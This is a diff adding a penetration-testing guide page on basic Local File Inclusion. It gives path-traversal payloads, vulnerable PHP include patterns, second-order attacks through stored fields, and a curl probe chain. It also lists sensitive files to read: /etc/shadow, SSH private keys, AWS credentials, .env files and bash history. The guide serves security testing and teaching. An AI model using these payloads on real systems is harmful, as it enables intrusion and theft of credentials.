@@ -1,0 +1,311 @@
+---
+title: Basic LFI
+description: Confirming LFI through path traversal, working around path prefixes and appended extensions, and second-order attacks via stored values.
+mitre: [T1190, T1083]
+d3fend: [D3-FA]
+impact: [FileRead]
+owasp: [A03]
+sidebar:
+  order: 2
+  label: Basic LFI
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Read a known file via the suspect parameter. Adjust the payload based on the path prefix, suffix, and any filtering the application does.
+
+```
+# Absolute path - works when input is used unmodified
+?page=/etc/passwd
+
+# Relative path with traversal - works when input is appended after a directory
+?page=../../../../etc/passwd
+
+# Excess ../ is harmless - / stays / once you're at root
+?page=../../../../../../../../etc/passwd
+
+# Windows targets
+?page=../../../../windows/win.ini
+?page=C:/Windows/System32/drivers/etc/hosts
+```
+
+Success indicator: contents of the target file in the response. `/etc/passwd` shows `root:x:0:0:...` and a list of system users.
+
+## The base probe
+
+`/etc/passwd` is the universal first move on Linux:
+
+```
+?page=/etc/passwd
+?page=../etc/passwd
+?page=../../etc/passwd
+?page=../../../etc/passwd
+?page=../../../../etc/passwd
+?page=../../../../../etc/passwd
+?page=../../../../../../etc/passwd
+?page=../../../../../../../etc/passwd
+```
+
+One of these almost always works on a vulnerable Linux app. Recognizing the response:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+```
+
+Once you see this, LFI is confirmed and the rest of this section is about refining the payload.
+
+For Windows:
+
+```
+?page=C:/Windows/System32/drivers/etc/hosts
+?page=C:\Windows\win.ini
+?page=../../../../windows/win.ini
+```
+
+## Path traversal - when input is appended
+
+The most common vulnerable pattern: input is appended after a directory prefix.
+
+```php
+// Vulnerable
+include("./languages/" . $_GET['page']);
+```
+
+A naive `?page=/etc/passwd` becomes `./languages//etc/passwd` - which doesn't exist (no `/etc` directory inside `languages/`). The fix is `../` to climb out:
+
+```
+?page=../../../../etc/passwd
+                            ↓
+            ./languages/../../../../etc/passwd
+                            ↓ resolves to
+                          /etc/passwd
+```
+
+### How many `../` do you need?
+
+Enough to reach root from wherever the application is running. On Linux web apps:
+
+- `/var/www/html` → 3 levels deep → `../../../etc/passwd` is the minimum
+- `/srv/www/example.com/public` → 4 levels deep → `../../../../etc/passwd`
+- `/opt/app` → 2 levels deep → `../../etc/passwd`
+
+**You don't need to be precise.** Once you reach `/`, additional `../` is harmless - `/` is its own parent, so `cd ..` from `/` stays at `/`. Stack 8-10 `../` and you've covered the common depths without thinking about it:
+
+```
+?page=../../../../../../../../etc/passwd
+```
+
+Use the minimum that works in writeups (looks cleaner); use excess during testing (saves a probe).
+
+### Verbose errors reveal the path
+
+When traversal fails, PHP errors often show the full path the function tried to load:
+
+```
+Warning: include(./languages/etc/passwd): failed to open stream: 
+No such file or directory in /var/www/html/index.php on line 12
+```
+
+Three things in that error:
+1. The prefix being prepended: `./languages/`
+2. Your input as it was used: `etc/passwd` (without leading `/`)
+3. The script's location: `/var/www/html/index.php` - so you're 3 levels deep
+
+PHP errors in production are themselves a misconfiguration, but they're a gift when present. Refer to the error to dial in the exact `../` count.
+
+## Path prefix without `/` separator
+
+A trickier variant - input is concatenated without a separator:
+
+```php
+// Vulnerable
+include("lang_" . $_GET['page']);
+```
+
+A `?page=../../../etc/passwd` becomes `lang_../../../etc/passwd` - invalid because `lang_..` isn't a directory.
+
+Insert a `/` at the start of your payload to make the prefix behave as a directory name:
+
+```
+?page=/../../../etc/passwd
+                ↓
+            lang_/../../../etc/passwd
+                ↓ resolves to (treating lang_ as a missing-but-traversable dir)
+            /../../../etc/passwd
+                ↓
+              /etc/passwd
+```
+
+This depends on the OS / framework treating the missing `lang_` directory as traversable. It works on most Linux PHP setups; sometimes fails on stricter configurations.
+
+When it doesn't work, the path is genuinely broken and you have to find a different sink - there's no way to detach the prefix from your input cleanly when there's no separator.
+
+## Appended extension
+
+A common pattern - the application appends `.php` (or another extension) after your input to constrain what files can be loaded:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+A `?page=/etc/passwd` becomes `/etc/passwd.php` - doesn't exist.
+
+Modern PHP (5.3+ for null-byte, 5.4+ for path truncation, all 7.x and 8.x) makes this hard to bypass with traversal alone. Three approaches:
+
+1. **Accept the constraint and read only `.php` files.** Useful for source disclosure via [PHP filters](/codex/web/lfi/php-filters/).
+2. **Use a PHP wrapper that doesn't care about the appended extension** - [`data://`](/codex/web/lfi/wrappers/) and [`expect://`](/codex/web/lfi/wrappers/) often work because the appended `.php` becomes part of the wrapper string that the wrapper ignores.
+3. **Old PHP only (≤5.3)** - null-byte injection or path truncation (see [Filter bypasses](/codex/web/lfi/filter-bypasses/)).
+
+On modern PHP, the appended-extension pattern restricts you to specific file types but doesn't close LFI entirely - it just changes what attacks work.
+
+## Absolute paths when no prefix
+
+When the application uses your input as-is (no prefix, no suffix), absolute paths work directly:
+
+```php
+include($_GET['page']);
+```
+
+```
+?page=/etc/passwd                    → /etc/passwd directly
+?page=/var/www/html/config.php       → loads config.php
+?page=C:/Windows/win.ini             → Windows
+```
+
+No `../` needed. Test this form first if you don't yet know what the application does with your input.
+
+## High-value files to read
+
+After confirming with `/etc/passwd`, expand into the targets that actually matter:
+
+### Linux
+
+```
+/etc/passwd                                  # users (confirmation classic)
+/etc/shadow                                  # password hashes - usually only root-readable
+/etc/hosts                                   # network neighbors
+/etc/issue                                   # OS version
+/etc/os-release                              # OS details
+/etc/crontab                                 # scheduled tasks → privesc targets
+/etc/sudoers                                 # who can sudo what
+/proc/self/environ                           # env vars of current process - sometimes RCE-able
+/proc/version                                # kernel version
+/proc/self/cmdline                           # current process arguments
+/proc/<PID>/cmdline                          # other processes
+
+# Application config
+/var/www/html/config.php                     # PHP apps - DB creds, secrets
+/var/www/html/.env                           # framework-style env files
+/var/www/html/wp-config.php                  # WordPress
+/var/www/html/configuration.php              # Joomla
+/var/www/html/sites/default/settings.php     # Drupal
+
+# User home directories
+/root/.ssh/id_rsa                            # root's SSH key (gold)
+/root/.bash_history                          # root's command history
+/home/<user>/.ssh/id_rsa                     # user SSH keys
+/home/<user>/.bash_history                   # what they typed
+/home/<user>/.aws/credentials                # AWS keys
+/home/<user>/.docker/config.json             # Docker registry creds
+
+# Server logs (for log poisoning - see that page)
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+```
+
+### Windows
+
+```
+C:\Windows\System32\drivers\etc\hosts       # hosts file
+C:\Windows\win.ini                          # legacy config (confirmation classic)
+C:\Windows\System32\inetsrv\config\applicationHost.config   # IIS config
+C:\inetpub\wwwroot\web.config               # ASP.NET app config
+C:\Users\<user>\.ssh\id_rsa                 # SSH key if OpenSSH installed
+C:\xampp\apache\conf\httpd.conf             # XAMPP
+```
+
+## Second-order LFI
+
+Sometimes the operator can't directly pass a path - but the application stores a user-controlled value and later uses it as a path. For example:
+
+```
+1. User registers with username "../../../etc/passwd"
+2. Application stores the malicious username in the database
+3. Later, a different feature loads /profile/<username>/avatar.png
+4. The avatar-loader fetches /profile/../../../etc/passwd/avatar.png
+5. Some path normalization gives /etc/passwd/avatar.png - still fails
+6. But /profile/<../../../etc/passwd>/profile.json might succeed depending on the join logic
+```
+
+The pattern: poison a stored field with traversal sequences, then trigger a code path that uses that field as part of a file path.
+
+**Detection**: register / configure accounts with usernames, paths, or identifiers containing `../`. Watch for any subsequent feature that loads "your X" by name - avatars, exports, "download my data," report files. If the feature returns unexpected content, second-order LFI is likely.
+
+**Operationally relevant fields to test:**
+
+- Username
+- Display name
+- Filename (in upload features that preserve the name)
+- File extension (some apps build paths like `/uploads/<id>.<ext>`)
+- Profile picture name
+- Export-format selectors
+- Theme / template name preferences
+
+The bug shows up most often in features that the development team added "later" - original code was carefully written, but the new export feature reuses fields the original code never expected to contain path-traversal sequences.
+
+## Probing checklist
+
+When testing a candidate parameter, work through these in order:
+
+1. **Reflection test** - does the parameter affect the response at all? Change the value, observe the response change. If no change, the parameter isn't being used.
+2. **Path-shaped values** - try `index.php`, `../index.php`, `/etc/passwd`. Verbose errors reveal the path structure.
+3. **Adjust the traversal count** - work from `../../etc/passwd` up to `../../../../../../etc/passwd` if needed.
+4. **Try prefix-detachment** - start with `/` to defeat naive prefix concatenation.
+5. **Check appended extension** - if `.php` is appended, try `php://filter` (see [PHP filters](/codex/web/lfi/php-filters/)).
+6. **Try other extensions** - if a directory is prepended, the same payload structure works for any included content type.
+
+A typical successful chain on a vulnerable target:
+
+```bash
+# Probe - file does not exist with current path structure
+curl 'https://target.example.com/?page=/etc/passwd'
+
+# Error reveals the path
+# > include(/var/www/html/languages//etc/passwd): failed to open stream
+
+# Adjust - climb out of /var/www/html/languages
+curl 'https://target.example.com/?page=../../../etc/passwd'
+
+# > root:x:0:0:root:/root:/bin/bash  <- success
+```
+
+## Detection-only payloads
+
+Probes that confirm LFI without committing to a deep exploit chain:
+
+```
+?page=/etc/passwd                            # Linux
+?page=C:/Windows/win.ini                     # Windows
+?page=../etc/passwd                          # single traversal
+?page=../../../../etc/passwd                 # several
+?page=php://filter/resource=index            # the page including itself, if rendering ≠ source
+```
+
+The cleanest single-shot LFI probe is `/etc/hosts` - small, present everywhere, recognizable format (`127.0.0.1 localhost`), and the response will fit in a single HTTP body without paging.
+
+## Notes
+
+- **Verbose errors are configuration mistakes.** Production apps shouldn't surface PHP errors - when they do, it's a finding in its own right, separate from the LFI. Mention both in reports.
+- **Read access only.** This page covers the read-anything primitive. Turning that into code execution requires the function to *execute* the loaded file (PHP `include`, NodeJS `res.render`, etc.) - see the [overview](/codex/web/lfi/) table.
+- **OS detection from one probe.** `/etc/passwd` only works on Linux/Unix; `C:\Windows\win.ini` only on Windows. Trying both early identifies the OS before you commit to OS-specific follow-ups.
+- **Bash history is underrated.** `~/.bash_history` for whatever user runs the app frequently contains passwords typed at command lines, MySQL passwords passed via `mysql -p<password>`, and full sudo commands. Read this on any successful LFI before pivoting.
+
+<Aside type="tip">
+The 30-second LFI check on any candidate parameter: try `../../../../../../etc/passwd` and look at the response. If you see `root:x:0:0:...` the bug is confirmed and worth investing in. If you see a verbose path error, read the error and adjust. If you see nothing different from a benign value, this parameter probably isn't vulnerable - move to the next one.
+</Aside>
